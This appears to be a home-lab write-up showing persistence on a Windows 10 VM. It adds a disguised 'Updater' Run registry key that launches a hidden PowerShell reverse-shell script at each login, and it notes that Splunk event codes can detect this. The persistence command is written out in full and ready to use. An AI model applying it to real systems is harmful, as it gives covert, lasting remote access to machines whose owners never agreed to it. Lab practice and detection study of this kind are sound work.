# 🪝 Persistence via Registry Run Key

## 💡 Goal
Establish persistence on the Windows victim machine so that the attacker's payload is automatically executed on user login.

---

## 🖥️ Target System
- **Host**: Victim (Windows 10 VM)
- **User**: vboxuser
- **IP**: 192.168.0.12

---

## ⚙️ Method: Registry Run Key

The following registry key was added to persist a PowerShell reverse shell payload:

```powershell
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "Updater" `
  -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\vboxuser\payload.ps1" `
  -PropertyType String
```
## 📝 Payload Script: payload.ps1
This file is saved at:
```
C:\Users\vboxuser\payload.ps1
```
It contains a PowerShell one-liner reverse shell to 192.168.0.11:4444.

## ✅ Verification
```
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
```
This confirmed the “Updater” key is active and will trigger the script at every login.
![Screenshot 2025-04-25 200720](https://github.com/user-attachments/assets/804f7845-c2ff-4382-8ba5-f684923e4ada)


## 📌 Notes
- Tested manually by restarting the VM and observing an incoming shell.
- Anti-virus must be disabled for the payload to execute.
- EventCode 3 and 1 can detect this activity in Splunk.
